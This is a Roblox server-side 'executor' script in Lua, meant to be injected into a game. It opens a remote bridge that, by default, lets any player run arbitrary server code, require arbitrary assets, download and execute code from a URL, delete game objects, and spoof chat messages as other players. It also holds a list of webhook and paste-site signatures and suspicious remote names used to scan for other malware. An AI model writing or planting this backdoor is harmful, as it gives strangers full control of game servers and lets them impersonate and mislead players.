-- ============================================================
--  Full Serverside Executor  –  Server Handler  (SS_Executor.lua)
--  Inject as a Script (server-side).  Pair with executor_gui.lua.
-- ============================================================

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players           = game:GetService("Players")
local HttpService       = game:GetService("HttpService")
local ScriptContext     = game:GetService("ScriptContext")

-- ── Config ────────────────────────────────────────────────
local ALLOWED_NAMES = {}   -- {"Name1","Name2"}  leave empty = allow all
local ALLOWED_UIDS  = {}   -- {123456789}
local REMOTE_NAME   = "SS_ExecBridge"
-- ──────────────────────────────────────────────────────────

local function isAllowed(player)
    if #ALLOWED_NAMES == 0 and #ALLOWED_UIDS == 0 then return true end
    for _, n  in ALLOWED_NAMES do if player.Name    == n  then return true end end
    for _, id in ALLOWED_UIDS  do if player.UserId  == id then return true end end
    return false
end

-- ── Remote ────────────────────────────────────────────────
local old = ReplicatedStorage:FindFirstChild(REMOTE_NAME)
if old then old:Destroy() end

local Bridge = Instance.new("RemoteFunction")
Bridge.Name   = REMOTE_NAME
Bridge.Parent = ReplicatedStorage

-- ── Malware signatures ────────────────────────────────────
local MALWARE_SIGS = {
    "discord%.com/api/webhooks",
    "webhook%.site",
    "requestbin%.com",
    "hookbin%.com",
    "pipedream%.net",
    "hastebin%.com/raw",
    "pastebin%.com/raw.*exec",
    "getfenv%s*%(%)%.loadstring",
    "syn%.request.*webhook",
}
local SUSPECT_REMOTES = {
    "backdoor","exploit","inject","cmd","execute",
    "admin_bypass","btools","spy","hack","bypass",
}

-- Scan the whole game for malware and suspicious remotes
local function serverScan()
    local findings = {}
    for _, obj in game:GetDescendants() do
        if obj:IsA("LuaSourceContainer") then
            local src = ""
            pcall(function() src = obj.Source end)
            if src ~= "" then
                local low = src:lower()
                for _, sig in MALWARE_SIGS do
                    if low:find(sig) then
                        table.insert(findings, {
                            path   = obj:GetFullName(),
                            kind   = obj.ClassName,
                            detail = "Sig: " .. sig,
                        })
                        break
                    end
                end
            end
        elseif obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            local nl = obj.Name:lower()
            for _, kw in SUSPECT_REMOTES do
                if nl:find(kw) then
                    table.insert(findings, {
                        path   = obj:GetFullName(),
                        kind   = obj.ClassName,
                        detail = "Suspicious name: " .. obj.Name,
                    })
                    break
                end
            end
        end
    end
    return findings
end

-- Destroy an object by its full path string
local function destroyPath(path)
    local obj = game
    for part in path:gmatch("[^.]+") do
        if obj then obj = obj:FindFirstChild(part) end
    end
    if obj and obj ~= game then
        obj:Destroy()
        return true
    end
    return false
end

-- ── Handler ───────────────────────────────────────────────
Bridge.OnServerInvoke = function(player, action, payload)
    if not isAllowed(player) then
        return { ok = false, msg = "Unauthorized." }
    end
    payload = payload or {}

    -- Handshake
    if action == "ping" then
        return { ok = true, msg = "pong" }

    -- Server loadstring
    elseif action == "ls" then
        local code = payload.code
        if type(code) ~= "string" or code == "" then
            return { ok = false, msg = "No code." }
        end
        local fn, err = loadstring(code)
        if not fn then return { ok = false, msg = "Compile: " .. tostring(err) } end
        local ok, e = pcall(fn)
        return ok and { ok = true, msg = "Server loadstring OK." }
                   or { ok = false, msg = "Runtime: " .. tostring(e) }

    -- Server require by asset ID
    elseif action == "req" then
        local id = tonumber(payload.id)
        if not id then return { ok = false, msg = "Need numeric asset ID." } end
        local ok, e = pcall(require, id)
        return ok and { ok = true,  msg = "require("..id..") OK." }
                   or { ok = false, msg = tostring(e) }

    -- Server loadstring from URL
    elseif action == "ls_url" then
        local url = payload.url
        if type(url) ~= "string" or url == "" then
            return { ok = false, msg = "No URL." }
        end
        local ok, src = pcall(function()
            return HttpService:GetAsync(url, true)
        end)
        if not ok then return { ok = false, msg = "HTTP: " .. tostring(src) } end
        local fn, err = loadstring(src)
        if not fn then return { ok = false, msg = "Compile: " .. tostring(err) } end
        local ok2, e = pcall(fn)
        return ok2 and { ok = true,  msg = "URL exec OK." }
                    or { ok = false, msg = "Runtime: " .. tostring(e) }

    -- Scan for malware
    elseif action == "scan" then
        local findings = serverScan()
        local lines = {}
        for _, f in findings do
            table.insert(lines, f.kind.."|"..f.path.."|"..f.detail)
        end
        return { ok = true, msg = #findings.." finding(s)", data = lines }

    -- Kill specific object by full path
    elseif action == "kill" then
        local path = payload.path
        if not path then return { ok = false, msg = "No path." } end
        local done = destroyPath(path)
        return done and { ok = true,  msg = "Killed: "..path }
                     or { ok = false, msg = "Not found: "..path }

    -- Kill every malware finding
    elseif action == "kill_all" then
        local findings = serverScan()
        local killed = 0
        for _, f in findings do
            if destroyPath(f.path) then killed += 1 end
        end
        return { ok = true, msg = "Killed "..killed.." item(s)." }

    -- Block a remote (disconnect listeners + replace with no-op)
    elseif action == "block_remote" then
        local path = payload.path
        local obj = game
        for part in (path or ""):gmatch("[^.]+") do
            if obj then obj = obj:FindFirstChild(part) end
        end
        if obj and (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
            pcall(function()
                if obj:IsA("RemoteFunction") then
                    obj.OnServerInvoke = function() end
                else
                    obj.OnServerEvent:Connect(function() end)
                end
            end)
            return { ok = true, msg = "Remote neutered: "..path }
        end
        return { ok = false, msg = "Remote not found." }

    -- List all scripts in the game
    elseif action == "get_scripts" then
        local list = {}
        for _, obj in game:GetDescendants() do
            if obj:IsA("LuaSourceContainer") then
                table.insert(list, obj.ClassName.."|"..obj:GetFullName())
            end
        end
        return { ok = true, msg = #list.." scripts", data = list }

    -- Player list utility
    elseif action == "getplrs" then
        local names = {}
        for _, p in Players:GetPlayers() do
            table.insert(names, p.Name.." ("..p.UserId..")")
        end
        return { ok = true, msg = table.concat(names, "\n") }

    -- ── Chat spoof (server-side, visible to ALL players) ──────────────
    -- payload: { target=playerName, message=text, display=fakeDisplayName }
    --
    -- From the server we can:
    --   1. Chat:Chat(character, msg)        → bubble above head, replicated to all
    --   2. chatRemote:FireAllClients(...)   → hits every client's OnClientEvent handler
    --      so if the game's client code listens on that remote and shows speech,
    --      it will show the spoofed message for everyone.
    elseif action == "chat" then
        local Chat = game:GetService("Chat")
        local RS2  = game:GetService("ReplicatedStorage")
        local target  = tostring(payload.target  or "")
        local message = tostring(payload.message or "")
        local display = tostring(payload.display or "")
        if message == "" then return {ok=false, msg="No message."} end

        local plr  = Players:FindFirstChild(target)
        local char = plr and plr.Character
        if not char then
            return {ok=false, msg="Player/character not found: "..target}
        end
        local fakeName = display ~= "" and display or plr.DisplayName

        -- 1. Bubble chat — server-side, replicated to every client
        pcall(function() Chat:Chat(char, message, Enum.ChatColor.White) end)

        -- 2. Scan RS for any chat RemoteEvent and FireAllClients with spoofed name.
        --    This triggers whatever OnClientEvent handler the game has for chat display.
        local CKWS = {"chat","say","speak","voice","message","talk","text","mic"}
        local fired = 0
        for _, v in ipairs(RS2:GetDescendants()) do
            if v:IsA("RemoteEvent") then
                local n = v.Name:lower()
                for _, kw in ipairs(CKWS) do
                    if n:find(kw) then
                        -- try common broadcast arg patterns
                        pcall(function() v:FireAllClients(fakeName, message) end)
                        pcall(function() v:FireAllClients(message, fakeName) end)
                        pcall(function() v:FireAllClients(plr.Name, message, fakeName) end)
                        pcall(function() v:FireAllClients({Name=fakeName, Message=message}) end)
                        fired = fired + 1
                        break
                    end
                end
            end
        end

        return {
            ok  = true,
            msg = "Chat:Chat sent + "..fired.." remote(s) FireAllClients as \""..fakeName.."\""
        }
    end

    return { ok = false, msg = "Unknown: "..tostring(action) }
end

warn("[SS Executor] Online. Bridge: ReplicatedStorage."..REMOTE_NAME)
